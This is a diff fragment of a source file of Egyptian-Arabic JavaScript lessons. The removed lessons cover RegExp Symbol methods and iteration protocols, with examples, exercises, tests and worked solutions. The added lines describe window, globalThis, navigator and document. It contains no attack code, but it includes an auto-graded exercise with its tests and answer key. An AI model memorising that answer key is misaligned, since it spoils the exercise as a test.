-| [[ RegExp.prototype[Symbol.matchAll] ]] | [[str.matchAll(re)]] | iterator على كل الـ matches بتفاصيلها، ولازم [[g]] |
-| [[ RegExp.prototype[Symbol.replace] ]] | [[str.replace(re, rep)]] و [[str.replaceAll(re, rep)]] | النص الجديد، و [[rep]] نص فيه [[$1]] أو دالة |
-| [[ RegExp.prototype[Symbol.search] ]] | [[str.search(re)]] | مكان أول match أو [[-1]]، ومبيلمسش [[lastIndex]] |
-| [[ RegExp.prototype[Symbol.split] ]] | [[str.split(re, limit)]] | array الأجزاء، والـ groups بتتحط بينها |
-
-والـ Symbols نفسهم ([[Symbol.match]] و [[Symbol.matchAll]] و [[Symbol.replace]] و [[Symbol.search]] و [[Symbol.split]]) قيم ثابتة على [[Symbol]] زي ما شفنا في الدرس اللي فات.
-
----
-
-## ٢. [[Symbol.search]] و [[Symbol.replace]] و [[Symbol.split]] على object بتاعك
-
-~~~js
-const dash = {
-  [Symbol.search](s) { return s.indexOf('-'); },
-  [Symbol.replace](s, rep) { return s.split('-').join(rep); },
-  [Symbol.split](s, limit) { return s.split('-', limit); },
-};
-const sku = 'TEA-500-EG';
-console.log(sku.search(dash), sku.replace(dash, '/'), sku.split(dash, 2));
-~~~
-
-~~~text الناتج
-3 TEA/500/EG [ 'TEA', '500' ]
-~~~
-
-- [[ [Symbol.search](s) ]]: method بالـ Symbol كاسم (computed key). [[s]] هو النص اللي اتنادى عليه [[search]]، فبنرجّع مكان أول [[-]]: 3.
-- [[ [Symbol.replace](s, rep) ]]: بتاخد النص و الـ [[rep]] زي ما اتبعت ([['/']] هنا). قسمنا عند [[-]] ولزقنا بـ [[rep]]: الـ replace بقت «replace all» لأننا قررنا كده.
-- [[ [Symbol.split](s, limit) ]]: [[limit]] هو الـ argument التاني بتاع [[split]] (2)، فرجع أول جزئين بس.
-- جوه، [[s.split('-')]] بيتنادى بنص مش بـ [[dash]]، فمفيش recursion.
-
----
-
-## ٣. النسخ الأصلية تتنادى مباشرة
-
-~~~js
-const re = /(\d+)/g;
-console.log(re[Symbol.replace](sku, '[$1]'), RegExp.prototype[Symbol.split].call(/-/, sku));
-console.log(/\d+/[Symbol.search](sku), [...re[Symbol.matchAll](sku)].map((m) => m[1]), re[Symbol.match](sku));
-~~~
-
-~~~text الناتج
-TEA-[500]-EG [ 'TEA', '500', 'EG' ]
-4 [ '500' ] [ '500' ]
-~~~
-
-- [[ re[Symbol.replace](sku, '[$1]') ]] = [[sku.replace(re, '[$1]')]] بالظبط، و [[$1]] هي أول group (درس «test و match و matchAll و replace»).
-- [[RegExp.prototype[Symbol.split].call(/-/, sku)]]: نفس الكلام بـ [[.call]]، وده الشكل اللي بتستخدمه جوه subclass عشان تنادي الأصلية.
-- [[search]] رجّعت 4 (مكان [[500]])، و [[matchAll]] رجّع iterator خدنا منه الـ group الأولى، و [[match]] بـ [[g]] رجّع النصوص بس.
-
-### subclass بتغيّر واحدة بس
-
-~~~js
-class CleanSplit extends RegExp {
-  [Symbol.split](str, limit) {
-    return RegExp.prototype[Symbol.split].call(this, str, limit).map((s) => s.trim()).filter(Boolean);
-  }
-}
-console.log(' tea , rice,, milk '.split(new CleanSplit(',')));
-~~~
-
-~~~text الناتج
-[ 'tea', 'rice', 'milk' ]
-~~~
-
----
-
-## ٤. [[Symbol.match]]: «انت regex؟»
-
-~~~js
-try { sku.startsWith(/TEA/); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-const literal = /TEA/;
-literal[Symbol.match] = false;
-console.log('/TEA/x'.startsWith(literal), String(literal));
-~~~
-
-~~~text الناتج
-TypeError: First argument to String.prototype.startsWith must not be a regular expression
-true /TEA/
-~~~
-
-- [[startsWith]] و [[endsWith]] و [[includes]] بيرفضوا الـ regex بقصد (عشان محدش يفتكر إنهم بيدوّروا بيه). وبيعرفوا إنه regex بسؤال [[Symbol.match]].
-- لما خليناه [[false]]، اتعامل كنص: [[String(literal)]] بـ [['/TEA/']]، و [['/TEA/x']] بيبدأ بالنص ده فعلًا، فـ [[true]].
-
-وده بيشتغل في الاتجاه التاني: أي object عنده [[Symbol.match]] truthy بيتعامل كـ regex في ٥ أماكن:
-
-| الـ method | بتعمل إيه لو شافت «regex» |
+| عايز | من |
 |---|---|
-| [[startsWith]] و [[endsWith]] و [[includes]] | ترمي [[TypeError]] وترفض تكمّل |
-| [[matchAll]] و [[replaceAll]] | تقرا [[flags]] ولازم فيها [[g]]، وإلا ترمي |
-| [[new RegExp(x)]] | تاخد [[source]] و [[flags]] منه |
+| مقاس التاب، العنوان، التاريخ، التايمرز، أحداث التاب | [[window]] |
+| الـ global object في أي بيئة | [[globalThis]] |
+| لغة اليوزر، النت، صلاحيات وميزات المتصفح | [[navigator]] |
+| أي عنصر في الصفحة، العنوان، حالة التحميل | [[document]] |
 
----
-
-## الخلاصة
-
-- الـ string methods الخمسة بيسلّموا الشغل لأي argument عنده الـ Symbol بتاعهم.
-- [[RegExp.prototype]] عنده الخمسة، وتقدر تناديهم مباشرة أو بـ [[.call]] من subclass.
-- matcher بتاعك = object فيه [[ [Symbol.replace] ]] و [[ [Symbol.split] ]] و [[ [Symbol.search] ]]، ومن غير [[Symbol.match]] إلا لو عايز يتعامل كـ regex.
-- مشروع «glob matcher» في الوحدة دي بيبني واحد كامل.`,
+اللي ميتلخبطش: [[var]] برّه function بيكتب على [[window]] (وممكن يكتب على [[name]])، و [[onLine]] مش ضمان إن فيه انترنت، والـ [[userAgent]] بيكدب بالتصميم: افحص الميزة نفسها.`,
           lines: [
-            R`object عادي هنخليه «يتصرف» زي regex بيدوّر على [[-]].`,
-            R`لما حد ينادي [[str.search(dash)]]، اللغة بتنادي دي بالنص، وبترجّع مكان أول [[-]].`,
-            R`لما حد ينادي [[str.replace(dash, rep)]]: بنقسم عند [[-]] ونلزق بـ [[rep]]، فكل الشرط بتتبدّل.`,
-            R`لما حد ينادي [[str.split(dash, limit)]]: بنقسم بنص [['-']] ونحترم الـ [[limit]].`,
-            R`قفلة الـ object: فيه ٣ methods أساميهم Symbols ومفيهوش [[Symbol.match]].`,
-            R`نص كود منتج فيه شرطتين.`,
-            R`[[3]] مكان أول شرطة، و [[TEA/500/EG]]، و [[[ 'TEA', '500' ]]] لأن الـ limit 2. التلاتة نادوا الـ methods بتاعتنا.`,
-            R`regex بـ [[g]] وفيه group بيمسك الأرقام.`,
-            R`نداء مباشر لـ [[ [Symbol.replace] ]] على الـ regex بيدّي [[TEA-[500]-EG]] زي [[replace]] بالظبط، و [[split]] الأصلية بـ [[.call]] على [[/-/]] بتدّي التلات أجزاء.`,
-            R`[[search]] المباشرة بـ [[4]]، و [[matchAll]] رجّعت iterator خدنا منه [[ m[1] ]] يعني [['500']]، و [[match]] بـ [[g]] رجّعت [[[ '500' ]]].`,
-            R`[[startsWith]] بيرفض أي regex برسالة TypeError، والـ [[catch]] بيطبعها.`,
-            R`regex عادي هنغيّر سؤال «انت regex؟» بتاعه.`,
-            R`[[Symbol.match]] بـ [[false]]: من دلوقتي الـ string methods مش هتعتبره regex.`,
-            R`[[startsWith]] حوّله لنص [['/TEA/']] وقارن: [[true]]، وطبعنا النص نفسه.`,
+            R`[[window]] هو نفس [[globalThis]] في الصفحة، و [[document]] خاصية عليه: الاتنين [[true]]`,
+            R`[[var]] برّه أي function في سكربت عادي بيعمل خاصية [[shopName]] على [[window]]`,
+            R`[[let]] متاح بالاسم من أي حتة، بس مش بيبقى خاصية على [[window]]`,
+            R`بيطبع «متجر النور» و [[undefined]]: الفرق بين [[var]] و [[let]] على الـ global object`,
+            R`مقاس المساحة اللي الصفحة بتترسم فيها بالـ CSS pixels، والمسار من العنوان`,
+            R`لغة المتصفح الأولى، واللستة كلها بالترتيب، و [[true]] لو فيه شبكة`,
+            R`[[addEventListener]] من غير [[window.]] قدامها بيسمع على [[window]]: بيتنده أول ما الشبكة تقطع`,
+            R`عنوان التاب، ولغة الصفحة من [[<html lang>]]، و [["loading"]] لو السكربت في الـ body`,
           ],
-          ref: [
-            { t: "MDN: Symbol.match", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/match" },
-            { t: "MDN: Symbol.matchAll", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/matchAll" },
-            { t: "MDN: Symbol.replace", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/replace" },
-            { t: "MDN: Symbol.search", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/search" },
-            { t: "MDN: Symbol.split", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/split" },
-            { t: "MDN: RegExp.prototype[Symbol.match]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.match" },
-            { t: "MDN: RegExp.prototype[Symbol.matchAll]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.matchAll" },
-            { t: "MDN: RegExp.prototype[Symbol.replace]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.replace" },
-            { t: "MDN: RegExp.prototype[Symbol.search]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.search" },
-            { t: "MDN: RegExp.prototype[Symbol.split]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.split" },
-            { t: "ECMAScript: String.prototype.replace", url: "https://tc39.es/ecma262/multipage/text-processing.html#sec-string.prototype.replace" },
-          ],
-          pre: [{ to: "js/test و match و matchAll و replace", why: R`الـ string methods نفسهم و [[$1]] و [[RegExp.escape]]` }, "js/well-known symbols: Symbol.toStringTag و isConcatSpreadable", { to: "js/extends و super", why: R`الـ subclass و [[super]] و [[.call]] على الـ prototype` }],
-        },
-        {
-          cmd: "iteration protocols: next و return و throw",
-          title: "البروتوكول كامل: iterable ولا iterator، و next و return و throw، ومين بيقفل الـ iterator لما تخرج بدري",
-          desc: R`**iterable** = أي object عنده [[ [Symbol.iterator]() ]] بترجّع **iterator**. و **iterator** = object عنده [[next()]] بترجّع [[{ value, done }]]. ده البروتوكول اللي [[for...of]] والـ spread والـ destructuring و [[Array.from]] و [[new Map(...)]] و [[Promise.all]] كلهم بيستخدموه.
-
-وفيه two methods اختياريين في الـ iterator:
-• [[return(value)]]: اللي بيلف بيناديها لما **يخرج بدري** ([[break]]، [[return]] من الدالة، error جوه الـ loop، destructuring خد أول عنصرين بس). فرصتك تقفل ملف أو connection. ومش بتتنادى لو اللفة خلصت لآخرها.
-• [[throw(error)]]: محدش من الحاجات دي بيناديها. بتستخدمها الـ generators و [[yield*]] (الدرس الجاي).
-
-وكل الـ iterators الجاهزة (array و Map و Set و string و generators) بيورثوا من [[Iterator.prototype]]، اللي عليه [[ [Symbol.iterator]() { return this } ]] والـ helpers ([[map]] و [[filter]]...)، وتقدر تورث منه بـ [[class extends Iterator]].`,
-          example: R`// iterator بإيدك: next و return، ومين بينادي return
-function countdown(from) {
-  let n = from;
-  return {
-    [Symbol.iterator]() { return this; },
-    next() { return n > 0 ? { value: n--, done: false } : { value: undefined, done: true }; },
-    return(value) { console.log('  return اتنادت'); n = 0; return { value, done: true }; },
-  };
-}
-for (const x of countdown(2)) console.log('for', x);
-for (const x of countdown(5)) { console.log('break بعد', x); break; }
-const [first, second] = countdown(5);
-console.log('destructuring', first, second, [...countdown(3)]);
-try { for (const x of countdown(5)) throw new Error('boom'); } catch (e) { console.log('caught', e.message); }
-const it = [10, 20][Symbol.iterator]();
-console.log(it[Symbol.iterator]() === it, it instanceof Iterator, it.next(), [...it]);`,
-          try: R`اعمل [[cursor(rows)]] بيمثّل cursor على قاعدة بيانات: بيزوّد عدّاد [[open]] لما يتعمل، وبيقلّله **مرة واحدة بس** لما يتقفل (لما يخلص لآخره أو لما [[return]] تتنادى). جرّبه في ٥ حالات: لفة كاملة، و [[break]]، و error جوه الـ loop، و [[const [firstRow] = cursor(rows)]]، و [[next()]] بإيدك من غير ما تقفل. اطبع [[open]] بعد كل واحدة.`,
-          sol: R`~~~js cursor.mjs
-let open = 0;
-function cursor(rows) {
-  open++;
-  let i = 0, closed = false;
-  const close = () => { if (!closed) { closed = true; open--; } };
-  return {
-    [Symbol.iterator]() { return this; },
-    next() {
-      if (i < rows.length) return { value: rows[i++], done: false };
-      close();
-      return { value: undefined, done: true };
-    },
-    return() { close(); return { value: undefined, done: true }; },
-  };
-}
-const rows = [{ id: 1 }, { id: 2 }, { id: 3 }];
-for (const r of cursor(rows)) {}
-console.log('بعد لفة كاملة', open);
-for (const r of cursor(rows)) if (r.id === 2) break;
-console.log('بعد break', open);
-try { for (const r of cursor(rows)) if (r.id === 1) throw new Error('bad row'); } catch {}
-console.log('بعد error', open);
-const [firstRow] = cursor(rows);
-console.log('بعد destructuring', open, firstRow);
-const leaked = cursor(rows); leaked.next();
-console.log('next بإيدك ومقفلتهوش', open);
-leaked.return();
-console.log('بعد return بإيدك', open);
-~~~
-
-~~~text الناتج (Node 24.22)
-بعد لفة كاملة 0
-بعد break 0
-بعد error 0
-بعد destructuring 0 { id: 1 }
-next بإيدك ومقفلتهوش 1
-بعد return بإيدك 0
-~~~
-
-- **القفل في مكانين:** آخر [[next]] (اللفة خلصت لوحدها، و [[return]] مش هتتنادى) و [[return]] (خروج بدري). و [[closed]] بيمنع العدّاد ينزل مرتين لو الاتنين حصلوا.
-- [[for...of]] و الـ destructuring قفلوا لوحدهم في كل الحالات.
-- **الفخ:** لما بتنادي [[next()]] بإيدك، مفيش حد هيقفل غيرك. [[open]] فضل 1 لحد ما ناديت [[return()]].`,
           practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[letters(log)]] iterator على [['a', 'b', 'c']] بيكتب [['R']] في [[log]] كل ما [[return]] تتنادى. اكتب الـ [[log]] النهائي قبل التشغيل:
-
-~~~js
-const log = [];
-const [x] = letters(log); log.push('|');
-const [y, ...rest] = letters(log); log.push('|');
-const all = [...letters(log)]; log.push('|');
-for (const l of letters(log)) if (l === 'b') break;
-console.log(log.join(' '));
-~~~`, done: R`كتبت [[R | | | R]] قبل التشغيل وطلع كده، وتقدر تقول ليه السطرين التاني والتالت مفيهمش [[R]].`, sol: R`~~~js letters.mjs
-function letters(log) {
-  const items = ['a', 'b', 'c'];
-  let i = 0;
-  return {
-    [Symbol.iterator]() { return this; },
-    next() { return i < items.length ? { value: items[i++], done: false } : { value: undefined, done: true }; },
-    return() { log.push('R'); return { done: true }; },
-  };
-}
-const log = [];
-const [x] = letters(log); log.push('|');
-const [y, ...rest] = letters(log); log.push('|');
-const all = [...letters(log)]; log.push('|');
-for (const l of letters(log)) if (l === 'b') break;
-console.log(log.join(' '));
-~~~
-
-~~~text الناتج (Node 24.22)
-R | | | R
-~~~
-
-- [[const [x] = ...]]: الـ destructuring خد عنصر واحد وفيه لسه، فقفل: [[R]].
-- [[const [y, ...rest] = ...]]: الـ rest لف لحد [[done: true]]، والـ iterator خلص لوحده، فمفيش حاجة تتقفل: من غير [[R]].
-- [[[...letters(log)]]]: نفس الكلام، الـ spread بيلف لآخره.
-- [[break]] عند [['b']]: خروج بدري، فـ [[R]].
-
-القاعدة: [[return]] = «أنا مش محتاج الباقي وانت لسه مخلصتش».` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** الـ [[playlist]] ده iterable، بس أول [[[...playlist]]] شغال والتاني فاضي، ولو لفيت عليه loop جوه loop بيبوظ. صلّحه من غير ما تغيّر شكل الـ [[songs]].
-
-~~~js
-const playlist = {
-  songs: ['intro', 'main', 'outro'],
-  i: 0,
-  [Symbol.iterator]() { return this; },
-  next() { return this.i < this.songs.length ? { value: this.songs[this.i++], done: false } : { value: undefined, done: true }; },
-};
-console.log([...playlist], [...playlist]);
-~~~`, done: R`المرتين بيطبعوا التلات أغاني، و loop جوه loop على نفس الـ playlist بيطبع ٣ أزواج متطابقين.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-[ 'intro', 'main', 'outro' ] []
-~~~
-
-المشكلة إن [[ [Symbol.iterator]() ]] بترجّع [[this]]، والعدّاد [[i]] على الـ playlist نفسها، فكل اللفّات بيتشاركوا عدّاد واحد واتستهلك.
-
-~~~js playlist-fixed.mjs
-const fixed = {
-  songs: ['intro', 'main', 'outro'],
-  [Symbol.iterator]() {
-    let i = 0;
-    const songs = this.songs;
-    return { next: () => (i < songs.length ? { value: songs[i++], done: false } : { value: undefined, done: true }) };
-  },
-};
-console.log([...fixed], [...fixed]);
-for (const a of fixed) for (const b of fixed) if (a === b) console.log('pair', a);
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 'intro', 'main', 'outro' ] [ 'intro', 'main', 'outro' ]
-pair intro
-pair main
-pair outro
-~~~
-
-**الشرح:** الـ **iterable** (اللي بتلف عليه) و الـ **iterator** (اللي بيمسك مكانك) حاجتين مختلفتين. كل نداء لـ [[ [Symbol.iterator]() ]] لازم يرجّع iterator **جديد** بعدّاد جديد ([[let i = 0]] جوه الـ method). [[return this]] صح بس في الـ iterator نفسه (عشان ينفع تلف عليه بـ [[for...of]])، وده معناه «اتستهلك مرة واحدة»، زي الـ generators بالظبط. والـ arrow function في [[next]] عشان تشوف [[i]] و [[songs]] من الـ closure.` },
-            { lvl: 'تطبيق', t: R`**اكتب اختبار:** [[countdown(from, onReturn)]] بتنادي [[onReturn]] جوه [[return]]. اكتب ملف اختبارات بـ [[node:test]] بيثبت: اللفة الكاملة مبتناديش [[return]]، و [[break]] بيناديها مرة، و error جوه الـ loop بيناديها والـ error بيعدّي، و [[[a]]] بيقفل و [[[b, ...rest]]] لأ، وبعد [[return]] مفيش قيم.`, done: R`[[node --test]] بيطبع ٥ اختبارات ✔ و [[fail 0]]، ولو شلت سطر [[onReturn()]] من الـ [[return]] ٣ اختبارات بيقعوا.`, sol: R`~~~js countdown.mjs
-export function countdown(from, onReturn = () => {}) {
-  let n = from;
-  return {
-    [Symbol.iterator]() { return this; },
-    next() { return n > 0 ? { value: n--, done: false } : { value: undefined, done: true }; },
-    return(value) { onReturn(); n = 0; return { value, done: true }; },
-  };
-}
-~~~
-
-~~~js countdown.test.mjs
-import { test } from 'node:test';
-import assert from 'node:assert/strict';
-import { countdown } from './countdown.mjs';
-
-test('لفة كاملة بتطلّع الأرقام ومبتناديش return', () => {
-  let calls = 0;
-  assert.deepEqual([...countdown(3, () => calls++)], [3, 2, 1]);
-  assert.equal(calls, 0);
-});
-
-test('break بينادي return مرة واحدة', () => {
-  let calls = 0;
-  for (const x of countdown(5, () => calls++)) if (x === 4) break;
-  assert.equal(calls, 1);
-});
-
-test('error جوه الـ loop بينادي return والـ error بيعدّي', () => {
-  let calls = 0;
-  assert.throws(() => { for (const x of countdown(5, () => calls++)) throw new Error('boom'); }, /boom/);
-  assert.equal(calls, 1);
-});
-
-test('destructuring جزئي بيقفل، و rest لأ', () => {
-  let calls = 0;
-  const [a] = countdown(5, () => calls++);
-  const [b, ...rest] = countdown(3, () => calls++);
-  assert.deepEqual([a, b, rest], [5, 3, [2, 1] ]);
-  assert.equal(calls, 1);
-});
-
-test('بعد return مفيش قيم تاني', () => {
-  const it = countdown(5);
-  it.next();
-  assert.deepEqual(it.return('x'), { value: 'x', done: true });
-  assert.deepEqual(it.next(), { value: undefined, done: true });
-});
-~~~
-
-~~~text الناتج: node --test (Node 24.22)
-✔ لفة كاملة بتطلّع الأرقام ومبتناديش return (8.5639ms)
-✔ break بينادي return مرة واحدة (1.7937ms)
-✔ error جوه الـ loop بينادي return والـ error بيعدّي (0.9982ms)
-✔ destructuring جزئي بيقفل، و rest لأ (0.3809ms)
-✔ بعد return مفيش قيم تاني (0.3884ms)
-ℹ tests 5
-ℹ pass 5
-ℹ fail 0
-~~~
-
-**الشرح:** [[node --test]] من غير أسامي ملفات بيدوّر على أي ملف اسمه [[*.test.mjs]] (أو [[.js]] و [[.cjs]]) ويشغّله. [[assert/strict]] بيخلي [[deepEqual]] يقارن بـ [[===]]. والاختبار التالت بيتأكد من حاجتين مع بعض: الـ error **مش** بيتبلع (البروتوكول بيقفل وبعدين يكمّل رمي الـ error الأصلي) و [[return]] اتنادت. وأهم اختبار هو الأول: بيمنع حد «يصلّح» حاجة وينادي [[return]] في الآخر دايمًا.` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[class DateRange extends Iterator]]: [[new DateRange('2026-02-26', '2026-03-02')]] بيطلّع التواريخ يوم يوم كنصوص [['YYYY-MM-DD']] لحد اليوم الأخير (داخل). اكتب [[next]] و [[return]] بس، واستخدم الـ helpers اللي جاية من [[Iterator]] عشان تجيب أول ٣ أيام جمعة في نوفمبر وديسمبر 2026.`, done: R`الـ spread بيطلّع ٥ تواريخ ومعدّي على ٢٨ فبراير لـ ١ مارس صح، و [[filter(...).take(3).toArray()]] بيرجّع [[2026-11-06]] و [[13]] و [[20]] وبيطبع إن الـ range اتقفل، والـ range المقلوب بيرجّع [[[]]].`, sol: R`~~~js date-range.mjs
-class DateRange extends Iterator {
-  #current; #end; #closed = false;
-  constructor(from, to) { super(); this.#current = new Date(from + 'T00:00:00Z'); this.#end = new Date(to + 'T00:00:00Z'); }
-  next() {
-    if (this.#closed || this.#current > this.#end) return { value: undefined, done: true };
-    const value = this.#current.toISOString().slice(0, 10);
-    this.#current = new Date(this.#current.getTime() + 86400000);
-    return { value, done: false };
-  }
-  return() { this.#closed = true; console.log('  DateRange اتقفل'); return { value: undefined, done: true }; }
-}
-console.log([...new DateRange('2026-02-26', '2026-03-02')]);
-const fridays = new DateRange('2026-11-01', '2026-12-31').filter((d) => new Date(d + 'T00:00:00Z').getUTCDay() === 5).take(3).toArray();
-console.log(fridays);
-console.log(new DateRange('2026-11-21', '2026-11-20').toArray(), Object.prototype.toString.call(new DateRange('2026-01-01', '2026-01-01')));
-~~~
-
-~~~text الناتج (Node 24.22)
-[
-  '2026-02-26',
-  '2026-02-27',
-  '2026-02-28',
-  '2026-03-01',
-  '2026-03-02'
-]
-  DateRange اتقفل
-[ '2026-11-06', '2026-11-13', '2026-11-20' ]
-[] [object Iterator]
-~~~
-
-**الشرح:**
-- [[extends Iterator]] و [[super()]]: الـ class بقت iterator «رسمي»، فعندها [[ [Symbol.iterator]() ]] (بترجّع [[this]]) و [[filter]] و [[take]] و [[toArray]] من غير ما تكتبهم.
-- كل التواريخ بـ UTC ([[T00:00:00Z]] و [[getUTCDay]] و [[toISOString]]) عشان التوقيت الصيفي وتوقيت الجهاز ميزوّدوش أو ينقّصوا يوم (درس «Date: الحساب الصح»). و [[86400000]] = ٢٤ × ٦٠ × ٦٠ × ١٠٠٠، مضمونة في UTC بس.
-- [[take(3)]] بعد ما خد التالت نادى [[return]] على الـ [[filter]]، اللي ناداها على الـ [[DateRange]]: اتطبع «اتقفل» مرة. والـ spread في السطر الأول لف لآخره فمفيش «اتقفل».
-- الـ tag [[[object Iterator]]] لأن [[Iterator.prototype]] عليه [[Symbol.toStringTag]] بـ [['Iterator']]. لو عايزه [['DateRange']] ضيف getter زي درس «well-known symbols».` },
-            { lvl: 'تحدي', t: R`**مسألة:** [[zip(a, b)]] بتاخد اتنين iterables وبترجّع iterator (بإيدك، من غير [[function*]]) بيطلّع أزواج [[[x, y]]] ويقف عند الأقصر. والمهم: لما واحد يخلص لازم **يقفل التاني** ([[return]] لو موجودة)، ولو اللي بيلف عمل [[break]] يقفل الاتنين.`, done: R`[[[...zip([1, 2, 3], ['x', 'y'])]]] بـ [[[[1, 'x'], [2, 'y']]]] والـ generator بتاع [[[1, 2, 3]]] اتقفل، و [[break]] بعد أول زوج قفل الاتنين، و [[zip('ab', [true])]] شغال على string، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js zip.mjs
-function zip(a, b) {
-  const ia = a[Symbol.iterator](), ib = b[Symbol.iterator]();
-  let done = false;
-  const closeBoth = () => { done = true; ia.return?.(); ib.return?.(); };
-  return {
-    [Symbol.iterator]() { return this; },
-    next() {
-      if (done) return { value: undefined, done: true };
-      const x = ia.next();
-      if (x.done) { done = true; ib.return?.(); return { value: undefined, done: true }; }
-      const y = ib.next();
-      if (y.done) { done = true; ia.return?.(); return { value: undefined, done: true }; }
-      return { value: [x.value, y.value], done: false };
-    },
-    return() { if (!done) closeBoth(); return { value: undefined, done: true }; },
-  };
-}
-function* tracked(name, items, log) { try { yield* items; } finally { log.push(name + ' closed'); } }
-const log = [];
-console.log([...zip(tracked('A', [1, 2, 3], log), tracked('B', ['x', 'y'], log))], log);
-const log2 = [];
-for (const p of zip(tracked('A', [1, 2, 3], log2), tracked('B', ['x', 'y', 'z'], log2))) break;
-console.log(log2, [...zip('ab', [true])]);
-~~~
-
-~~~text الناتج (Node 24.22)
-[ [ 1, 'x' ], [ 2, 'y' ] ] [ 'B closed', 'A closed' ]
-[ 'A closed', 'B closed' ] [ [ 'a', true ] ]
-~~~
-
-**الشرح:**
-- [[ia.return?.()]]: [[?.]] قبل الأقواس = «نادي لو موجودة»، لأن [[return]] اختيارية في البروتوكول (الـ iterator بتاع الـ array مثلًا معندوش).
-- لما [[B]] خلص لوحده (آخر [[next]] رجّع [[done]])، الـ [[finally]] بتاعه اشتغل لوحده، وإحنا قفلنا [[A]] اللي كان لسه فيه [[3]]. من غير السطر ده، [[A]] كان هيفضل مفتوح (لو ملف، الملف مش هيتقفل).
-- [[done]] بيضمن إن مفيش [[next]] بيتنادى على iterator اتقفل، وإن [[return]] متقفلش مرتين.
-- [[tracked]] generator صغير بـ [[try...finally]] عشان نشوف القفل في الـ [[log]] (الدرس الجاي بيشرح ليه [[finally]] بتشتغل مع [[return]]).
-
-و [[Iterator.zip]] جاي في المواصفة (Stage 3 دلوقتي، مش في Node 24 ولا في المنهج)، وبيعمل نفس القفل ده.` },
-          ],
-          check: { lang: "js", starter: R`function zip(a, b) {
-  // iterator بإيدك: next بيرجّع [x, y]، ويقفل التاني لما واحد يخلص، و return تقفل الاتنين
-}`, tests: R`function* tracked(name, items, log) { try { yield* items; } finally { log.push(name + ' closed'); } }
-test("أزواج لحد الأقصر", () => expect([...zip([1, 2, 3], ['x', 'y'])]).toEqual([[1, 'x'], [2, 'y']]));
-test("الأقصر في الأول", () => expect([...zip([1], 'abc')]).toEqual([[1, 'a']]));
-test("لما B يخلص، A يتقفل", () => { const log = []; [...zip(tracked('A', [1, 2, 3], log), tracked('B', ['x'], log))]; expect(log.includes('A closed')).toBe(true); });
-test("لما A يخلص، B يتقفل", () => { const log = []; [...zip(tracked('A', [1], log), tracked('B', ['x', 'y'], log))]; expect(log.includes('B closed')).toBe(true); });
-test("break بيقفل الاتنين", () => { const log = []; for (const p of zip(tracked('A', [1, 2], log), tracked('B', [3, 4], log))) break; expect(log.sort()).toEqual(['A closed', 'B closed']); });
-test("بعد الخلاص done على طول", () => { const z = zip([1], [2]); z.next(); z.next(); expect(z.next()).toEqual({ value: undefined, done: true }); });`, solution: R`function zip(a, b) {
-  const ia = a[Symbol.iterator](), ib = b[Symbol.iterator]();
-  let done = false;
-  const closeBoth = () => { done = true; ia.return?.(); ib.return?.(); };
-  return {
-    [Symbol.iterator]() { return this; },
-    next() {
-      if (done) return { value: undefined, done: true };
-      const x = ia.next();
-      if (x.done) { done = true; ib.return?.(); return { value: undefined, done: true }; }
-      const y = ib.next();
-      if (y.done) { done = true; ia.return?.(); return { value: undefined, done: true }; }
-      return { value: [x.value, y.value], done: false };
-    },
-    return() { if (!done) closeBoth(); return { value: undefined, done: true }; },
-  };
-}` },
-          flag: "script",
-          deep: {
-            why: R`أي حاجة بتتلف عليها وماسكة resource (ملف، connection، cursor، timer، listener) لازم تتقفل حتى لو اللي بيلف خرج بدري. البروتوكول حل ده مرة واحدة: [[return]] بتتنادى لوحدها في كل خروج بدري، فاللي بيلف مش محتاج يفتكر. ولو فهمت الفرق بين iterable و iterator هتفهم ليه الـ generator «بيخلص» بعد لفة، وليه array بتتلف ألف مرة.`,
-            how: R`[[for (const x of obj)]] من جوه (GetIterator ثم IteratorStep):
-1. [[const it = obj[Symbol.iterator]()]]. لو مش function: [[TypeError: obj is not iterable]]. لو رجّعت حاجة مش object: [[Result of the Symbol.iterator method is not an object]].
-2. كل لفة: [[const r = it.next()]]. لو [[r]] مش object: [[TypeError: Iterator result 5 is not an object]]. لو [[r.done]] truthy: خلاص، **من غير** [[return]].
-3. لو الـ body عمل [[break]] أو [[return]] أو [[continue]] لـ loop برّه أو رمى error: IteratorClose = لو [[it.return]] موجودة ناديها. لو الخروج كان بـ error، الـ error الأصلي هو اللي بيكمّل حتى لو [[return]] رمت هي كمان.
-
-الـ destructuring بيعمل نفس الحاجة: بياخد العناصر اللي محتاجها، ولو الـ iterator لسه مخلصش بيقفله. و [[new Map(it)]] و [[Array.from(it, fn)]] بيقفلوا لو حصل error في النص ([[Iterator value 3 is not an entry object]] أو الـ [[fn]] رمت). و [[throw]] مش جزء من أي حاجة من دول: [[yield*]] بس اللي بيبعتها.
-
-و [[Iterator.prototype]] هو أبو كل الـ iterators الجاهزة، وعليه [[ [Symbol.iterator]() ]] بترجّع [[this]] (عشان الـ iterator نفسه يتلف بـ [[for...of]]) والـ helpers. و [[Iterator]] نفسه abstract: [[new Iterator()]] بيرمي [[TypeError: Abstract class Iterator not directly constructable]]، بس [[class X extends Iterator]] مسموح.`,
